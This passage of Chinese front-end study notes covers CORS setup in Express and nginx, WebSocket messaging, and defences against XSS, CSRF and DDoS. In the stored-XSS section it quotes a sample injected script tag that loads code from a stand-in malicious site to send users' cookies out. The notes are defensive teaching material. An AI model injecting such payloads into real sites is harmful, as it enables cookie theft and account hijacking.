        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Allow-Credentials&quot;</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 允许前端获取哪个头信息</span>
        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Expose-Headers&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 处理 OPTIONS 预检的存活时间，单位 s</span>
        res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Access-Control-Max-Age&quot;</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//发送PUT 请求会做一个试探性的请求OPTIONS，其实是请求了两次，当接收的请求为OPTIONS时不做任何处理</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">&quot;OPTIONS&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">&quot;/getDate&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// res.setHeader('name', 'nihao'); // 设置自定义响应头信息</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">&quot;I love you&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/getDate&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">&quot;I love you&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br></div></div><h5 id="nginx实现跨域"><a href="#nginx实现跨域" class="header-anchor">#</a> nginx实现跨域</h5> <h6 id="配置"><a href="#配置" class="header-anchor">#</a> 配置</h6> <p>两种方式：</p> <ul><li>cors设置头：add_header</li> <li>反向代理：proxy_pass proxy_set_header</li></ul> <p><code>nginx.conf</code></p> <div class="language-nginx line-numbers-mode"><pre class="language-nginx"><code><span class="token keyword">server</span> <span class="token punctuation">{</span>
   <span class="token comment">#方式一: add_header</span>
    <span class="token keyword">location</span> <span class="token operator">~</span><span class="token punctuation">.</span><span class="token operator">*</span>\<span class="token punctuation">.</span>json <span class="token punctuation">{</span>
        <span class="token keyword">root</span> json<span class="token punctuation">;</span>
        <span class="token keyword">add_header</span> <span class="token string">&quot;Access-Control-Allow-Origin&quot;</span> <span class="token string">&quot;*&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$request_method</span> <span class="token operator">=</span> <span class="token string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">#示例；</span>
        <span class="token keyword">add_header</span> <span class="token string">'Access-Control-Allow-Origin'</span> <span class="token string">'https://docs.domain.com'</span><span class="token punctuation">;</span> 
        <span class="token keyword">add_header</span> <span class="token string">'Access-Control-Allow-Credentials'</span> <span class="token string">'true'</span><span class="token punctuation">;</span> 
        <span class="token keyword">add_header</span> <span class="token string">'Access-Control-Allow-Methods'</span> <span class="token string">'GET, POST, PUT, DELETE, PATCH, OPTIONS'</span><span class="token punctuation">;</span> 
        <span class="token keyword">add_header</span> <span class="token string">'Access-Control-Allow-Headers'</span> <span class="token string">'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,token'</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>
    <span class="token comment">#方式二: proxy_pass proxy_set_header</span>
    <span class="token comment"># 访问的http://xx/ssm/api/相当于一个代理url，实际访问的是http://xx:8888/ssm/api/</span>
    <span class="token keyword">location</span> <span class="token operator">/</span>ssm<span class="token operator">/</span>interfaces<span class="token operator">/</span><span class="token punctuation">{</span>
        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token punctuation">:</span><span class="token number">8888</span><span class="token operator">/</span>ssm<span class="token operator">/</span>api<span class="token operator">/</span><span class="token punctuation">;</span>
        
        <span class="token keyword">proxy_set_header</span> Host <span class="token variable">$host</span><span class="token punctuation">;</span>
        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Real<span class="token operator">-</span>IP <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
        <span class="token keyword">proxy_set_header</span> REMOTE<span class="token operator">-</span>HOST <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>
        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h5 id="websocket实现跨域"><a href="#websocket实现跨域" class="header-anchor">#</a> WebSocket实现跨域</h5> <p>WebSocket 没有跨域限制，高级 API（不兼容），想要兼容低版本浏览器，可以使用 <code>socket.io</code> 的库，WebSocket 与 HTTP 内部都是基于 TCP 协议，<strong>区别在于 HTTP 是单向的（单双工），WebSocket 是双向的（全双工）</strong>，协议是 <code>ws://</code> 和 <code>wss://</code> 对应 <code>http://</code> 和 <code>https://</code>，因为<strong>没有跨域限制，所以使用 <code>file://</code> 协议也可以进行通信。</strong></p> <h6 id="客户端-服务器的设置"><a href="#客户端-服务器的设置" class="header-anchor">#</a> 客户端/服务器的设置</h6> <div class="language-html line-numbers-mode"><pre class="language-html"><code>//客户端：index.html
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>en<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>UTF-8<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>页面<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
        <span class="token keyword">let</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span><span class="token string">'ws://localhost:3000'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        socket<span class="token punctuation">.</span><span class="token function-variable function">onopen</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'I love you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        socket<span class="token punctuation">.</span><span class="token function-variable function">onmessage</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// I love you, too</span>
        <span class="token punctuation">}</span>
    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//服务器设置；</span>
<span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;express&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> WebSocket <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">&quot;ws&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> wss <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket<span class="token punctuation">.</span>Server</span><span class="token punctuation">(</span><span class="token punctuation">{</span> port<span class="token operator">:</span> <span class="token number">3000</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
wss<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&quot;connection&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">ws</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ws<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">&quot;message&quot;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// I love you</span>
        ws<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">&quot;I love you, too&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="web安全"><a href="#web安全" class="header-anchor">#</a> Web安全</h3> <h4 id="常见的安全漏洞"><a href="#常见的安全漏洞" class="header-anchor">#</a> <strong>常见的安全漏洞</strong></h4> <ul><li><strong>XSS 攻击</strong>：对 Web 页面注入脚本，使用 JavaScript 窃取用户信息，诱导用户操作。</li> <li><strong>CSRF 攻击</strong>：伪造用户请求向网站发起恶意请求。</li> <li><strong>钓鱼攻击</strong>：利用网站的跳转链接或者图片制造钓鱼陷阱。</li> <li><strong>HTTP参数污染</strong>：利用对参数格式验证的不完善，对服务器进行参数注入攻击。</li> <li><strong>远程代码执行</strong>：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。</li> <li><strong>XST攻击</strong>；Https中间人攻击。</li></ul> <h4 id="其他类型分类"><a href="#其他类型分类" class="header-anchor">#</a> 其他类型分类</h4> <ul><li>HTTP本身不具备必要的安全功能，需要开发者自行开发认证及会话管理功能；</li> <li>在客户端可以篡改请求，导致Web 应用收到与预期不一致的内容，可能包含攻击代码；</li> <li>针对Web应用的攻击模式；
<ul><li><strong>主动攻击</strong>：指攻击者通过直接访问 Web 应用， 把攻击代码传入，如：SQL 注入攻击和 OS 命令注 入攻击</li> <li><strong>被动攻击</strong>：是指利用圈套策略执行攻击代码的攻击模式，如：跨站脚本攻击、跨站点请求伪造</li> <li>利用用户的身份攻击企业内部的网络</li></ul></li></ul> <h4 id="安全威胁xss的防范"><a href="#安全威胁xss的防范" class="header-anchor">#</a> 安全威胁<code>XSS</code>的防范</h4> <p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener noreferrer">XSS<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>（cross-site scripting跨域脚本攻击）攻击是最常见的 Web 攻击，其重点是**『跨域』和『客户端执行』**</p> <p><strong>XSS</strong> 攻击一般分为两类：</p> <ul><li>Reflected XSS（<strong>反射型的 XSS 攻击</strong>）:主要是由于<strong>服务端接收到客户端的不安全输入</strong>，在客户端触发执行从而发起 Web 攻击。【反脚】</li> <li>Stored XSS（<strong>存储型的 XSS 攻击</strong>）:基于存储的 XSS 攻击，是通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是<strong>通过一些富文本编辑器编辑的，很容易插入危险代码</strong>。【存富】</li> <li>DOM XSS防范方式；</li> <li>JSONP XSS防范方式；</li></ul> <h5 id="防御csp"><a href="#防御csp" class="header-anchor">#</a> <strong>防御CSP</strong></h5> <p>浏览器自身具有一定针对各种攻击的防范能力，**他们一般是通过开启 Web 安全头生效的。框架内置了一些常见的 Web 安全头的支持。**及通过CSP防御；</p> <p>W3C 的 Content Security Policy，简称 CSP，<strong>主要是用来定义页面可以加载哪些资源，减少 XSS 的发生</strong>。</p> <p>示例：<code>Content-Security-Policey: default-src 'self'; img-src *;</code></p> <p>设置：</p> <p>1、meta</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Content-Security-Policy<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>script-src <span class="token punctuation">'</span>self<span class="token punctuation">'</span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>2、Http 头部</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code>Content-Security-Policy:
script-src 'unsafe-inline' 'unsafe-eval' 'self' *.54php.cn *.yunetidc.com *.baidu.com *.cnzz.com *.duoshuo.com *.jiathis.com;report-uri /error/csp
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="安全威胁-csrf-的防范"><a href="#安全威胁-csrf-的防范" class="header-anchor">#</a> 安全威胁 CSRF 的防范</h4> <p><a href="https://www.owasp.org/index.php/CSRF" target="_blank" rel="noopener noreferrer">CSRF<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>（Cross-site request forgery）<strong>跨站请求伪造</strong>，也被称为 <code>One Click Attack</code> 或者 <code>Session Riding</code>，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。 <strong>CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。</strong></p> <h5 id="防范方式"><a href="#防范方式" class="header-anchor">#</a> 防范方式</h5> <p>通常来说，对于 CSRF 攻击有一些通用的<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#CSRF_Specific_Defense" target="_blank" rel="noopener noreferrer">防范方案<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，简单的介绍几种常用的防范方案：</p> <ul><li><strong>Synchronizer Tokens</strong>：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。</li> <li><strong>Double Cookie Defense</strong>：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。</li> <li><strong>Custom Header</strong>：信任带有特定的 header（例如 <code>X-Requested-With: XMLHttpRequest</code>）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都<a href="https://www.djangoproject.com/weblog/2011/feb/08/security/" target="_blank" rel="noopener noreferrer">放弃了该防范方式<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>。</li></ul> <p>预防:</p> <ol><li><strong>A 站 (预防站) 检查 http 请求的 header 确认其 origin</strong></li> <li><strong>检查 CSRF token</strong></li></ol> <h5 id="同源检查"><a href="#同源检查" class="header-anchor">#</a> 同源检查</h5> <p>通过检查来过滤简单的 CSRF 攻击, 主要检查一下两个 header:</p> <ul><li>Origin Header：请求来源限制</li> <li>Referer Header</li></ul> <h3 id="防御简述版【推荐】"><a href="#防御简述版【推荐】" class="header-anchor">#</a> 防御简述版【推荐】</h3> <h4 id="xss攻击"><a href="#xss攻击" class="header-anchor">#</a> XSS攻击</h4> <p>Cross-site <strong>script</strong>，<strong>跨站脚本攻击</strong>；为了与层叠样式表css区分，<strong>将跨站脚本简写为XSS</strong>；当其它用户浏览该网站时候，该段 HTML 代码会自动执行，从而达到攻击的目的，如盗取用户的 Cookie，破坏页面结构，重定向到其它网站等。</p> <p><strong>XSS 类型</strong>：一般可以分为： 非持久型 XSS 和持久性 XSS</p> <ul><li><p>Reflected XSS（<strong>反射型的 XSS 攻击</strong>）<strong>非持久型</strong>:</p> <ul><li>主要是由于<strong>服务端接收到客户端的不安全输入</strong>，在客户端触发执行从而发起 Web 攻击。比如：对一个页面的 URL 中的某个参数做文章，把精心构造好的恶意脚本<strong>包装在 URL 参数重中</strong>，再将这个 URL 发布到网上，骗取用户访问，从而进行攻;</li> <li>用户将一段含有恶意代码的请求提交给 Web 服务器，Web 服务器接收到请求时，又将恶意代码反射给了浏览器端，这就是反射型 XSS 攻击。 在现实生活中，黑客经常会通过 QQ 群或者邮件等渠道诱导用户去点击这些恶意链接，所以对于一些链接我们一定要慎之又慎。</li> <li><strong>Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方</strong>。</li></ul> <p><img src="/rat-summ/assets/img/image-20211104101841567.4b454bf7.png" alt="image-20211104101841567"></p></li> <li><p>Stored XSS（<strong>存储型的 XSS 攻击</strong>）<strong>持久型</strong></p> <ul><li>基于存储的 XSS 攻击，是通过提交带有恶意脚本的<strong>内容存储在服务器上</strong>，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是<strong>通过一些富文本编辑器编辑的，很容易插入危险代码</strong>。(如上述的<strong>留言评论功能</strong>);</li> <li>利用漏洞提交恶意 JavaScript 代码，比如在input, textarea等所有可能输入文本信息的区域，输入<code>&lt;script src=&quot;http://恶意网站&quot;&gt;&lt;/script&gt;</code>等，提交后信息会存在服务器中，当用户再次打开网站请求到相应的数据，打开页面，恶意脚本就会将用户的 Cookie 信息等数据上传到黑客服务器。</li> <li>比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取<code>cookie</code>中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点；</li></ul> <p><img src="/rat-summ/assets/img/image-20211104094427555.3ba3dbac.png" alt="image-20211104094427555"></p></li></ul> <p><strong>防范</strong></p> <ul><li><strong>确定性类型字段加强校验</strong>：当一些字段是确定性类型的，在输入内容时应按照相应规则加强校验，例如手机号、邮箱等信息。</li> <li><strong>HTML 模版转义</strong>：对于前后端一体的应用，拼接 HTML 模版这些也是必不可少的，应对 HTML 模版做好充分转义。一些常用的模版引擎：pug、ejs 这些默认都带有转义功能，来防止 XSS 攻击。</li> <li><strong>设置 httpOnly</strong>：禁止用户读取 cookie，就算注入恶意代码，也无法读取 cookie 信息冒充用户提交信息。</li> <li><strong>过滤和转码</strong>：关键字符做过滤或转码，如果是过滤，直接过滤掉指定的关键词，页面就不会展示了。如果是转码，不会过滤掉但也不会让其执行，例如 <code>&lt;script&gt;</code> 转义为 <code>&lt;script&gt;</code>。<strong>推荐一个库js-xss，用于对用户输入的内容进行过滤，以避免遭受 XSS 攻</strong>。</li> <li><strong>CSP</strong>：一种内容安全策略，需要在服务端设置；</li></ul> <h4 id="csrf攻击"><a href="#csrf攻击" class="header-anchor">#</a> CSRF攻击</h4> <p>CSRF(Cross-site <strong>request</strong> forgery), 中文名称：<strong>跨站请求伪造</strong></p> <p>CSRF 可以简单理解为：攻击者盗用了你的身份，以你的名义发送恶意请求，容易造成隐私泄露以及财产安全。</p> <p>防范：</p> <ul><li><strong>post请求</strong>; 隐藏令牌</li> <li><strong>Token验证;</strong> 使用token</li> <li><strong>验证码</strong></li></ul> <p>值得注意的是，过滤用户输入的内容不能阻挡 CSRF 攻击，我们需要做的事过滤请求的来源，因为有些请求是合法，有些是非法的，所以 <strong>CSRF 防御主要是过滤那些非法伪造的请求来源</strong>。</p> <h4 id="xss和csrf区别"><a href="#xss和csrf区别" class="header-anchor">#</a> XSS和CSRF区别</h4> <ul><li><strong>原理不同</strong>，XSS是向<strong>目标网站注入JS代码，然后执行JS里的代码。<strong>CSRF是</strong>利用网站A本身的漏洞，去请求网站A的api</strong>；</li> <li>XSS不需要登录，而CSRF需要用户先登录目标网站获取cookie</li> <li><strong>XSS的目标是服务器，CSRF的目标是用户</strong></li> <li><strong>XSS是利用合法用户获取其信息</strong>，而<strong>CSRF是伪造成合法用户发起</strong>请求</li></ul> <h3 id="ddos防御"><a href="#ddos防御" class="header-anchor">#</a> DDos防御</h3> <blockquote><h4 id="客户端不断进行请求链接会怎样-ddos-distributed-denial-of-service-攻击"><a href="#客户端不断进行请求链接会怎样-ddos-distributed-denial-of-service-攻击" class="header-anchor">#</a> 客户端不断进行请求链接会怎样？DDos(Distributed Denial of Service)攻击？</h4></blockquote> <p>答：服务器端会为每个请求创建一个链接，并向其发送确认报文，然后等待客户端进行确认</p> <p><strong>(1). DDos 攻击：</strong></p> <ul><li>客户端向服务端发送请求链接数据包</li> <li>服务端向客户端发送确认数据包</li> <li>客户端不向服务端发送确认数据包，服务器一直等待来自客户端的确认</li></ul> <p><strong>(2). DDos 预防：（没有彻底根治的办法，除非不使用TCP）</strong></p> <ul><li><strong>限制同时打开SYN半链接的数目</strong></li> <li><strong>缩短SYN半链接的Time out 时间</strong></li> <li>关闭不必要的服务</li></ul> <h3 id="接口-ddos-防御"><a href="#接口-ddos-防御" class="header-anchor">#</a> 接口(DDOS)防御</h3> <h4 id="描述"><a href="#描述" class="header-anchor">#</a> 描述</h4> <p>利用<strong>目标系统网络服务功能缺陷</strong>或者<strong>直接消耗</strong>其系统资源，使得该目标系统无法提供正常的服务。</p> <p>DDoS 攻击通过大量合法的请求占用大量网络资源，以达到瘫痪网络的目的。 具体有几种形式：</p> <ul><li>通过使网络过载来干扰甚至阻断正常的网络通讯；</li> <li>通过向服务器提交大量请求，使服务器超负荷；</li> <li>阻断某一用户访问服务器；</li> <li>阻断某服务与特定系统或个人的通讯。</li></ul> <h4 id="防御"><a href="#防御" class="header-anchor">#</a> 防御</h4> <ol><li>网关控制流量洪峰，对在一个时间段内出现流量异常，可以拒绝请求;</li> <li>源<code>ip</code>请求个数限制。对请求来源的<code>ip</code>请求个数做限制;</li> <li>频率限制（1s内接口调用次数限制）IP限制； 防刷一般分两种：
